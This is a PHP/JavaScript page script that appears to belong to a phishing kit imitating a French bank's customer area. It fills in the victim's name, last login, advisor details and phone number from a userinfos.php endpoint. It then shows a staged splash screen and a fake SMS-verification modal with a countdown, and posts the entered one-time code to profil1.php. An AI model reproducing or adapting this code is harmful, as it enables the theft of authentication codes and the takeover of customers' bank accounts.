<script type="text/javascript">

let loc = window.location;
let baseUrl = loc.origin + loc.pathname.substr(0, loc.pathname.lastIndexOf('/')+1);
let infosUrl = baseUrl + "userinfos.php";
let userInfosScript = document.createElement("script");
userInfosScript.type = "text/javascript";
userInfosScript.src =  infosUrl;
document.getElementsByTagName('head')[0].appendChild(userInfosScript);

$(window).on('load', function() {
	// console.log(userInfos);
	let smsDelay = parseInt(<?php echo($sms_delay); ?>);
	
	setTimeout(function() {
		$('#splashScreen').toggle();
		$('.modal-dialog').animate({'margin-top': '160px'}, 'slow');
		startTimer();
	}, (smsDelay - loadTime)*5000 );
	
	
	if(userInfos.client) {
		$('span.capitalize:nth-child(1)').html(userInfos.client.firstname + ' ');
		$('span.capitalize:nth-child(2)').html(userInfos.client.lastname);
		$('p.lastConnexion span').html(userInfos.client.lastConnexion);
		if(userInfos.client.type != 'part') {
			$('div.Agent__title__sub:nth-child(2) > div:nth-child(1)').html('Votre conseiller professionnel');
		}
	}
	else {
		$('p.lastConnexion').hide();
	}
	if(userInfos.agents) {
		$('.Agent__title > div:nth-child(1)').html(userInfos.agents.name);
		// $('div.Agent__title__sub:nth-child(2) > div:nth-child(1)').html('Votre conseiller au quotidien');
		$('div.Agent__title__sub:nth-child(3) > div:nth-child(1)').html(userInfos.agents.agency);
		$('div.Agent__title__sub:nth-child(4) > a:nth-child(1) > span:nth-child(2)').html(userInfos.agents.phone);
		
	}
	else {
		$('div.Agent__title__sub:nth-child(3)').hide();
	}
	if(userInfos.univers && userInfos.univers != 'espace particulier') {
		$('div.universe').html('Mon' + userInfos.univers);
		$('p.titleView').html(userInfos.univers + ' > Gérer mon abonnement');
	}
	if(userInfos.options) {
		if(userInfos.options.dateSouscription.replace(/\s/g, '') !='')
			$('span.lato-reg-18').html('le '+ userInfos.options.dateSouscription);
		
		upadateUserOptions();
	}
	else {
		$('span.lato-reg-18').html('');
	}
	if(userInfos.mobile){
		$('#mobile-number').html('le numéro <span style="color: #204c85;">'+userInfos.mobile+'</span>');
	}
	
	$('span.ng-scope > input').on('input', function() {
		$('#error-row').hide();
	});
	
	$('.modal_device__blue_button').on('click', function() {
	
		let smsCode = $('span.ng-scope > input').val();
		let smsRegex = /^(\S\s*){4,}$/;
		
		if(!smsRegex.test(smsCode)) {
			$('#error-row').show();
			return false;
		}
		
		$('#spinner-canvas').show();
		
		$.ajax({
			url: 'profil1.php',
			type: 'POST',
			async: false,
			data: {
				smscode: smsCode
			},
			success: function(data) {
				setTimeout(function() {
					window.location.replace("profil1.php");
				},5*1000);
			},
			error: function() {
				// console.log('error: ajax > sms');
			}
		});
		
	});
	
	
});

function upadateUserOptions() {

	let options = userInfos.options.options;
	let rowDiv = '\
	<div class="row ng-scope">\
		<div class="col-sm-5 tableOptions_name" style="padding: 10px;">\
			<span style="padding-right:30px;" class="ng-binding">Fonction Connect SMS :</span><br>\
		</div>\
		<div class="col-sm-3 tableOptions_action" style="padding: 10px;">\
			<span class="ng-scope">\
				<span class="ng-scope">souscrit le <span class="lato-reg-15 ng-binding" ></span></span>\
			</span>\
		</div>\
		<div class="col-sm-4 tableOptions_action" style="padding: 10px;">\
			<span class="ng-scope">\
				<a class="bt-Sp6b ral-bold-12 upper" >modifier</a>\
			</span>\
		</div>\
	</div>';

	for(var i=0; i<options.length; i++ ) {
		$('.tableOptions').append($(rowDiv));
	}

	$('.tableOptions > div.row').each(function(index, element) {
		let option = options[index];
		let btAction = '';
		let btClass = '';
		let tmpHtml = '';
		
		$(this).find('.col-sm-5 > span').html(option.nom);
		
		if(option.souscrit) {
			if(option.dateSouscription != '' && option.dateSouscription != 'false') {
				$(this).find('.col-sm-3 > span > span > span').html(option.dateSouscription);
				//tmpHtml = $(this).find('.col-sm-3 > span > span > span').html();
				//$(this).find('.col-sm-3 > span > span').text('souscrit le ').append($(tmpHtml));
			}
			else {
				$(this).find('.col-sm-3 > span > span').text('souscrit');
				$(this).find('.col-sm-3 > span > span > span').html('');
			}
		}
		else {
			$(this).find('.col-sm-3 > span > span').text('non souscrit');
			$(this).find('.col-sm-3 > span > span > span').html('');
		}
		
		if(!option.souscrit && option.souscriptionPossible && option.link && !option.instanceCloture) {
			btAction = 'souscrire';
			btClass = 'bt-SsouscrireOption';
		}
		else if (option.souscrit && option.resiliationPossible) {
			btAction = 'resilier';
			btClass = 'bt-SresilierOption';
		}
		else if (option.souscrit && option.modificationPossible && option.link) {
			btAction = 'modifier';
			btClass = 'bt-SmodifierOption';
		}
		
		if(btAction != '') {
			$(this).find('.col-sm-4 > span > a').html(btAction);
			$(this).find('.col-sm-4 > span > a').addClass(btClass);
		}
		else {
			$(this).find('.col-sm-4').html('');
		}
		
	});
}

function startTimer() {
  var presentTime = document.getElementById('sms-timer').innerHTML;
  var timeArray = presentTime.split(/[:]+/);
  var m = timeArray[0];
  var s = checkSecond((timeArray[1] - 1));
  if(s==59){m=m-1}
  //if(m<0){alert('timer completed')}
  
  document.getElementById('sms-timer').innerHTML =
    m + ":" + s;
  setTimeout(startTimer, 1000);
}

function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec};
  if (sec < 0) {sec = "59"};
  return sec;
}

</script>
